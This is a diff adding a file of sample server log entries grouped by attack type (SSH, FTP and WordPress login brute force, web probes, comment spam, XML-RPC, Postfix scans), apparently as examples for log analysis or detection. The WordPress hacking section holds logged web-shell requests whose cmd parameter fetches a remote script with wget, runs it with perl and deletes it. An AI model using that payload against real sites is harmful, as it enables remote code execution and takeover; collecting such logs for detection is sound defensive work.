@@ -1,0 +1,47 @@
+﻿SSH Brute Force
+Oct  2 06:25:46 host-vps sshd[8463]: Failed password for root from 116.31.116.17 port 31142 ssh2
+Oct  2 06:25:48 host-vps sshd[8463]: Failed password for root from 116.31.116.17 port 31142 ssh2
+Oct  2 06:25:51 host-vps sshd[8463]: Failed password for root from 116.31.116.17 port 31142 ssh2
+Oct  2 06:25:51 host-vps sshd[8463]: Received disconnect from 116.31.116.17: 11:  [preauth]
+
+Web Server Attacks
+191.96.249.97 - - [20/Apr/2017:15:45:49 +0200] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 162 "-" "-" "-"
+190.129.24.154 - - [14/Jul/2015:06:41:59 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 404 162 "-" "Python-urllib/2.6" "-"
+190.129.24.154 - - [20/Apr/2017:09:04:47 +0200] "PROPFIND /webdav/ HTTP/1.1" 405 166 "-" "WEBDAV Client" "-"
+180.97.106.37 - - [20/Apr/2017:04:31:02 +0200] "\x04\x01\x00P\xB4\xA3qR\x00" 400 166 "-" "-" "-"
+
+WP Comments Spam
+216.244.82.83 - - [08/Oct/2016:01:02:03 -0400] "POST /wp-comments-post.php HTTP/1.1" 200 3433 "http://www.website.com/" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" "-"
+112.90.92.106 - - [08/Oct/2016:01:23:09 -0400] "POST /wp-comments-post.php HTTP/1.1" 200 3433 "http://www.website.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0" "-"
+199.168.97.28 - - [08/Oct/2016:02:28:36 -0400] "POST /wp-comments-post.php HTTP/1.0" 200 3421 "http://www.website.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36" "-"
+192.185.4.146 - - [08/Oct/2016:09:19:13 -0400] "POST /wp-comments-post.php HTTP/1.1" 200 3433 "http://www.website.com/" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" "-"
+
+WP Hacking Attempts
+client: 178.137.83.79, server: www.website.com, request: "GET /wp-content/plugins/formcraft/file-upload/server/php/upload.php HTTP/1.1", host: "www.website.com"
+client: 191.101.235.206, server: www.website.com, request: "GET /wp-content/plugins/revslider/temp/update_extract/revslider/blacunix.php?cmd=cd%20/tmp%20;wget%20http://nowosely.by//cache/doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.txt* HTTP/1.1", host: "www.website.com"
+client: 191.101.235.206, server: www.website.com, request: "GET /wp-admin/user/reload-x.pHp?cmd=cd%20/tmp%20;wget%20http://nowosely.by//cache/doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.txt* HTTP/1.1", host: "www.website.com"
+client: 191.101.235.206, server: www.website.com, request: "GET /wp-admin/user/myluph.php?cmd=cd%20/tmp%20;wget%20http://nowosely.by//cache/doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.txt* HTTP/1.1", host: "www.website.com"
+
+WP Login Brute Force
+client: 222.108.76.91, server: www.website.com, request: "GET /wp-login.php HTTP/1.1", host: "www.website.com"
+client: 90.73.82.117, server: www.website.com, request: "GET /wp-login.php HTTP/1.1", host: "www.website.com"
+client: 109.64.27.55, server: www.website.com, request: "GET /wp-login.php HTTP/1.1", host: "www.website.com"
+client: 49.149.16.66, server: www.website.com, request: "GET /wp-login.php HTTP/1.1", host: "www.website.com"
+
+WP XML-RPC Attack
+client: 91.200.12.47, server: www.website.com, request: "POST /xmlrpc.php HTTP/1.1", host: "www.website.com"
+client: 83.24.28.210, server: www.website.com, request: "POST /xmlrpc.php HTTP/1.1", host: "www.website.com"
+client: 177.129.13.106, server: www.website.com, request: "POST /xmlrpc.php HTTP/1.1", host: "www.website.com"
+client: 186.32.202.243, server: www.website.com, request: "POST /xmlrpc.php HTTP/1.1", host: "www.website.com"
+
+FTP Brute Force
+Oct 12 06:44:25 host-vps proftpd[14581] host-vps (110.11.148.226[110.11.148.226]): FTP session opened.
+Oct 12 06:44:26 host-vps proftpd[14581] host-vps (110.11.148.226[110.11.148.226]): USER admin: no such user found from 110.11.148.226 [110.11.148.226] to xx.xx.xx.xx:21
+Oct 12 06:44:28 host-vps proftpd[14581] host-vps (110.11.148.226[110.11.148.226]): FTP session closed.
+Oct 12 07:57:56 host-vps proftpd[14904] host-vps (106.76.88.50[106.76.88.50]): FTP session opened.
+
+Postfix Scans
+Oct 10 18:43:08 host-vps postfix/smtpd[9294]: connect from host53-251-static.114-81-b.business.telecomitalia.it[81.114.251.53]
+Oct 10 18:43:09 host-vps postfix/smtpd[9294]: disconnect from host53-251-static.114-81-b.business.telecomitalia.it[81.114.251.53]
+Oct 10 18:46:29 host-vps postfix/anvil[9296]: statistics: max connection rate 1/60s for (smtp:81.114.251.53) at Oct 10 18:43:08
+Oct 10 18:46:29 host-vps postfix/anvil[9296]: statistics: max connection count 1 for (smtp:81.114.251.53) at Oct 10 18:43:08
